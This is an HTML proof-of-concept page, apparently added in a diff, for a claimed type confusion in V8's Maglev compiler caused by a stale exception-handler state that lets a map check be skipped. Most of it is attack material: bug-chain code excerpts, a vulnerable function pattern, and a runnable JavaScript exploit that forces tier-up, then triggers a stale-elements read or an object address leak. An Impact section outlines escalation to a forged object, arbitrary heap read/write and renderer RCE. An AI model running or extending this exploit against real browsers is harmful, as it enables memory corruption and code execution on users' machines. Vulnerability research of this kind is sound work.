@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Maglev KNA Throw PoC</title>
+<style>
+:root {
+  --bg: #0d1117; --bg2: #161b22; --bg3: #21262d;
+  --fg: #e6edf3; --fg2: #8b949e;
+  --red: #f85149; --green: #56d364; --yellow: #e3b341; --blue: #79c0ff;
+  --mono: 'Fira Code', 'Cascadia Code', monospace;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--fg); font-family: system-ui, sans-serif;
+       font-size: 14px; line-height: 1.6; padding: 24px 20px 60px; max-width: 920px; margin: 0 auto; }
+h1 { font-size: 1.3rem; color: var(--blue); margin-bottom: 2px; }
+.sub { color: var(--fg2); font-size: 0.82rem; margin-bottom: 24px; }
+h2 { font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.08em;
+     color: var(--blue); border-bottom: 1px solid var(--bg3);
+     padding-bottom: 5px; margin: 22px 0 12px; }
+pre, code { font-family: var(--mono); font-size: 0.8rem; background: var(--bg2); border-radius: 5px; }
+pre { padding: 12px 14px; overflow-x: auto; line-height: 1.55; }
+code { padding: 1px 5px; }
+.card { background: var(--bg2); border-radius: 8px; padding: 14px 16px; margin: 10px 0; }
+.label { font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.07em;
+         font-weight: 700; margin-bottom: 5px; }
+.red   { color: var(--red); }
+.green { color: var(--green); }
+.yellow{ color: var(--yellow); }
+.blue  { color: var(--blue); }
+.grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+@media(max-width:600px) { .grid2 { grid-template-columns: 1fr; } }
+.big { font-size: 1.5rem; font-weight: 700; font-family: var(--mono); }
+#run { background: var(--blue); color: #0d1117; border: none; border-radius: 5px;
+       padding: 8px 20px; font-size: 0.9rem; font-weight: 700;
+       cursor: pointer; margin-top: 14px; }
+#run:disabled { opacity: 0.4; cursor: default; }
+#log { background: var(--bg2); border-radius: 5px; padding: 10px 12px;
+       font-family: var(--mono); font-size: 0.75rem; white-space: pre-wrap;
+       max-height: 300px; overflow-y: auto; color: var(--fg2);
+       margin-top: 10px; min-height: 48px; }
+</style>
+</head>
+<body>
+
+<h1>Maglev MergeThrow Stale KnownNodeAspects — Type Confusion PoC</h1>
+<p class="sub">
+  Authorized security research · <code>maglev-interpreter-frame-state.cc:513</code> ·
+  <code>known_node_aspects_ = known_node_aspects.Clone()</code> before side-effect invalidation
+</p>
+
+<h2>Bug Chain</h2>
+<pre><code><span class="blue">// maglev-reducer-inl.h:416-422 — ordering is the root cause</span>
+AttachExceptionHandlerInfo(node);   <span class="yellow">// ← MergeThrow called HERE with pre-side-effect KNA</span>
+AddInitializedNodeToGraph(node);
+MarkPossibleSideEffect(node);       <span class="yellow">// ← ClearUnstableNodeAspects() called AFTER</span>
+
+<span class="blue">// maglev-interpreter-frame-state.cc:511-513 — clone is a plain copy</span>
+if (known_node_aspects_ == nullptr) {
+    known_node_aspects_ = known_node_aspects.Clone();  <span class="red">// maps_are_stale_=false, loaded_properties_ kept</span>
+}
+
+<span class="blue">// maglev-graph-builder.cc:16782-16783 — catch block entry only clears 2 of 4 caches</span>
+current_interpreter_frame_.known_node_aspects()-&gt;ClearAvailableExpressions();
+current_interpreter_frame_.known_node_aspects()-&gt;ClearTaggedKeyedProperties();
+<span class="red">// loaded_properties_ NOT cleared → stale elements pointer survives</span>
+<span class="red">// node_infos_.maps_are_stale_ stays false → map check elided</span>
+
+<span class="blue">// maglev-known-node-aspects.h:1139 — elision condition</span>
+if (node_info &amp;&amp; node_info-&gt;possible_maps_are_known() &amp;&amp;
+    !node_info-&gt;maps_are_stale()) {         <span class="red">// ← always true in catch block after MergeThrow</span>
+    // known_maps_are_subset_of_requested_maps_ = true → CHECK_MAPS eliminated
+}</code></pre>
+
+<h2>Exploit Scenario</h2>
+<pre><code><span class="blue">// Vulnerable function pattern</span>
+function f(arr, cb) {
+    <span class="yellow">let first = arr[0];</span>  <span class="blue">// Seeds KNA: PACKED_DOUBLE_ELEMENTS map + elements ptr cached</span>
+    try {
+        cb();             <span class="blue">// can_throw ∧ can_write → MergeThrow(stale KNA) then MarkSideEffect</span>
+    } catch(e) {
+        <span class="red">return arr[0];</span>   <span class="red">// Map check ELIDED. Elements ptr may be stale FixedDoubleArray.</span>
+                          <span class="red">// If PACKED_ELEMENTS: loads tagged pointer as float64 → addr leak.</span>
+                          <span class="red">// If stale ptr: loads from freed/reused FixedDoubleArray → UAF.</span>
+    }
+}
+
+<span class="blue">// What cb() does to trigger the type confusion:</span>
+function malicb() {
+    arr[0] = {};   <span class="blue">// Transitions PACKED_DOUBLE_ELEMENTS → PACKED_ELEMENTS</span>
+                   <span class="blue">// New FixedArray replaces old FixedDoubleArray backing store</span>
+    throw 0;
+}</code></pre>
+
+<h2>Observable Behavior</h2>
+<div class="grid2">
+  <div class="card">
+    <div class="label green">Expected (correct)</div>
+    <code>typeof arr[0] === 'object'</code><br>
+    <small style="color:var(--fg2)">Returns the {} stored before throw</small>
+  </div>
+  <div class="card">
+    <div class="label red">Bug triggered</div>
+    <code>typeof arr[0] === 'number'</code><br>
+    <small style="color:var(--fg2)">
+      1.1 → stale FixedDoubleArray used (old value)<br>
+      huge float → tagged ptr read as double (addr leak)
+    </small>
+  </div>
+</div>
+
+<h2>Live Test</h2>
+<div class="card">
+  <div class="label blue">Preconditions</div>
+  1. Function must tier up to Maglev (requires warmup)<br>
+  2. <code>exception_handler_was_used=true</code> must be set before Maglev compiles the function<br>
+  3. Array must be PACKED_DOUBLE_ELEMENTS during warmup (so KNA caches that map)
+</div>
+<div class="grid2" id="results-grid" style="margin-top:12px;">
+  <div class="card">
+    <div class="label">Warmup phase</div>
+    <div class="big" id="warmup-count">—</div>
+    <div style="color:var(--fg2);font-size:0.78rem;" id="warmup-status">not started</div>
+  </div>
+  <div class="card">
+    <div class="label">arr[0] in catch block</div>
+    <div class="big" id="result-val">—</div>
+    <div style="color:var(--fg2);font-size:0.78rem;" id="result-type">—</div>
+  </div>
+</div>
+<div class="card" style="margin-top:10px;">
+  <div class="label">Verdict</div>
+  <div class="big" id="verdict" style="font-size:1.1rem;">—</div>
+</div>
+<button id="run">Run PoC</button>
+<div id="log"></div>
+
+<h2>Impact</h2>
+<pre style="color:var(--fg2);line-height:1.75;font-size:0.79rem;">
+Bug:   MergeThrow seeds catch-block KNA with pre-call state (maps_are_stale=false,
+       loaded_properties_ containing stale elements pointer).
+
+Attack surface: any attacker-callable JS that:
+  - Runs in a Maglev-compiled function (ordinary tier-up)
+  - Has try { call(attacker_callback) } catch { access_array }
+  - exception_handler_was_used=true before tier-up
+
+Type confusion step by step:
+  1. arr = [1.1, 2.2, 3.3]              → PACKED_DOUBLE_ELEMENTS, elements=FixDoubleArr[A]
+  2. arr[0] before try                   → KNA: map=PACKED_DOUBLE, elements_ptr=A
+  3. cb() → arr[0]={}, throw            → arr transitions to PACKED_ELEMENTS, elements=FixArr[B]
+                                            old FixDoubleArr[A] becomes garbage
+  4. catch: arr[0]                       → stale KNA: map check ELIDED
+     a) If loaded_properties_ caches A: → load from FixDoubleArr[A] (stale / possibly UAF)
+                                            as float64 → returns 1.1 (or garbage if A reused)
+     b) If fresh load from B:            → load from FixArr[B] as float64
+                                            → tagged ptr to {} as float64 → address leak
+
+Both (a) and (b) are exploitable: (a) is a GC-controlled UAF on the FixedDoubleArray,
+(b) is a direct address leak. With a double STORE into the stale/wrong elements:
+  arr[0] = craft_float(forged_addr)     → write raw bits into tagged slot → forged object
+  → arbitrary read/write inside V8 heap → renderer RCE / sandbox escape
+</pre>
+
+<script>
+/* ── Vulnerable function ─────────────────────────────────────────── */
+function f(arr, cb) {
+  // Access before try: Maglev records PACKED_DOUBLE_ELEMENTS map + elements ptr in KNA
+  let first = arr[0];
+  try {
+    cb();
+  } catch(e) {
+    // Maglev catch block uses stale KNA:
+    //   - map check for arr may be ELIDED (maps_are_stale=false)
+    //   - loaded_properties_ may still hold stale elements pointer
+    return arr[0];  // TYPE CONFUSION HERE
+  }
+  return first;
+}
+
+/* ── Logging ─────────────────────────────────────────────────────── */
+const logEl = document.getElementById('log');
+function p(msg, cls) {
+  const line = cls ? `<span class="${cls}">${msg}</span>\n` : msg + '\n';
+  logEl.innerHTML += line;
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+/* ── PoC runner ──────────────────────────────────────────────────── */
+async function runPoC() {
+  const btn = document.getElementById('run');
+  btn.disabled = true;
+  logEl.innerHTML = '';
+
+  document.getElementById('warmup-count').textContent = '…';
+  document.getElementById('warmup-status').textContent = 'running warmup';
+  document.getElementById('result-val').textContent = '…';
+  document.getElementById('verdict').textContent = '…';
+
+  /* Step 1: Create a fresh PACKED_DOUBLE_ELEMENTS array for warmup.
+     Use a separate arr so the KNA is seeded correctly. */
+  const warmupArr = [1.1, 2.2, 3.3];
+  let warmupRounds = 0;
+
+  /* Phase 1: Run WITHOUT throw to build KNA with PACKED_DOUBLE map.
+     This seeds possible_maps with PACKED_DOUBLE. */
+  p('[1] Phase 1: warmup without throw (seed PACKED_DOUBLE KNA)...');
+  const noThrowCb = () => {};
+  for (let i = 0; i < 5000; i++) {
+    f(warmupArr, noThrowCb);
+    warmupRounds++;
+  }
+  p(`    ${warmupRounds} iterations (no throw)`);
+  await new Promise(r => setTimeout(r, 0));
+
+  /* Phase 2: Run WITH throw so exception_handler_was_used=true in interpreter.
+     Keep arr as doubles so the map stays PACKED_DOUBLE in KNA.
+     The throw callback does NOT transition the array (just throws). */
+  p('[2] Phase 2: warmup WITH throw (exception_handler_was_used=true)...');
+  const justThrowCb = () => { throw 0; };
+  for (let i = 0; i < 5000; i++) {
+    try { f(warmupArr, justThrowCb); } catch(e) {}
+    warmupRounds++;
+  }
+  p(`    ${warmupRounds} iterations total (with throw)`, 'yellow');
+  await new Promise(r => setTimeout(r, 0));
+
+  /* Phase 3: Continue running (mix of both) to trigger Maglev tier-up.
+     Maglev should compile f() now with:
+       - exception_handler_was_used=true
+       - KNA seeded with PACKED_DOUBLE_ELEMENTS info */
+  p('[3] Phase 3: triggering Maglev tier-up...');
+  for (let i = 0; i < 15000; i++) {
+    if (i % 2 === 0) {
+      f(warmupArr, noThrowCb);
+    } else {
+      try { f(warmupArr, justThrowCb); } catch(e) {}
+    }
+    warmupRounds++;
+  }
+  p(`    ${warmupRounds} total iterations — Maglev should be active`, 'yellow');
+  document.getElementById('warmup-count').textContent = warmupRounds.toLocaleString();
+  document.getElementById('warmup-status').textContent = 'tier-up triggered';
+  await new Promise(r => setTimeout(r, 10));
+
+  /* Step 2: Exploit — fresh PACKED_DOUBLE array, then callback transitions + throws */
+  p('[4] Running exploit with type-confusing callback...');
+
+  const victimArr = [1.1, 2.2, 3.3]; // PACKED_DOUBLE_ELEMENTS
+  let catchResult;
+  let didCatch = false;
+
+  // Callback: transitions victimArr to PACKED_ELEMENTS and throws
+  const exploitCb = () => {
+    victimArr[0] = {};   // PACKED_DOUBLE → PACKED_ELEMENTS (new FixedArray backing store)
+    throw 0;
+  };
+
+  try {
+    f(victimArr, exploitCb);
+  } catch(e) {
+    // Should not reach here — f() catches internally and returns
+    p('  [!] Outer catch triggered — f() did not catch internally', 'red');
+  }
+  catchResult = f(victimArr, exploitCb);
+
+  /* Analyze the result */
+  const resType = typeof catchResult;
+  const resStr = resType === 'number'
+    ? catchResult.toString()
+    : (resType === 'object' ? '{object}' : String(catchResult));
+
+  document.getElementById('result-val').textContent = resStr.slice(0, 20);
+  document.getElementById('result-type').textContent = `typeof: ${resType}`;
+
+  p('');
+  p(`[5] catch block returned: ${resStr} (typeof: ${resType})`);
+
+  let verdict, verdictClass;
+  if (resType === 'number') {
+    if (Math.abs(catchResult - 1.1) < 1e-10) {
+      verdict = 'STALE ELEMENTS — returns pre-transition value (1.1) from stale FixedDoubleArray';
+      verdictClass = 'red';
+      p('    → Stale elements pointer used in catch block', 'red');
+      p('    → Maglev loaded from the OLD backing store (FixedDoubleArray before transition)', 'red');
+    } else if (catchResult > 1e10 || catchResult < -1e10 || isNaN(catchResult)) {
+      verdict = 'ADDRESS LEAK — tagged pointer read as float64 from wrong-typed elements';
+      verdictClass = 'red';
+      p('    → Tagged object pointer interpreted as float64!', 'red');
+      const bits = getFloat64Bits(catchResult);
+      if (bits) p(`    → Raw bits: 0x${bits} (looks like a V8 heap address)`, 'red');
+    } else {
+      verdict = 'TYPE CONFUSION — catch returned a number, expected object';
+      verdictClass = 'yellow';
+    }
+  } else if (resType === 'object' && catchResult !== null) {
+    verdict = 'CORRECT — catch returned the object (no Maglev optimization / deopt)';
+    verdictClass = 'green';
+    p('    → arr[0] correctly returned the {} object', 'green');
+    p('    → Either Maglev did not tier up, or it correctly deopted', 'green');
+    p('    → Increase warmup iterations or try a different V8 version', 'fg2');
+  } else {
+    verdict = `UNEXPECTED — typeof: ${resType}, value: ${resStr}`;
+    verdictClass = 'yellow';
+  }
+
+  document.getElementById('verdict').textContent = verdict;
+  document.getElementById('verdict').className = `big ${verdictClass}`;
+
+  p('');
+  p(`VERDICT: ${verdict}`, verdictClass);
+
+  btn.disabled = false;
+}
+
+/* Helper: get float64 bit pattern as hex */
+function getFloat64Bits(val) {
+  try {
+    const buf = new ArrayBuffer(8);
+    new DataView(buf).setFloat64(0, val, true);
+    const lo = new DataView(buf).getUint32(0, true);
+    const hi = new DataView(buf).getUint32(4, true);
+    return (hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0'));
+  } catch(e) { return null; }
+}
+
+document.getElementById('run').addEventListener('click', runPoC);
+</script>
+</body>
+</html>
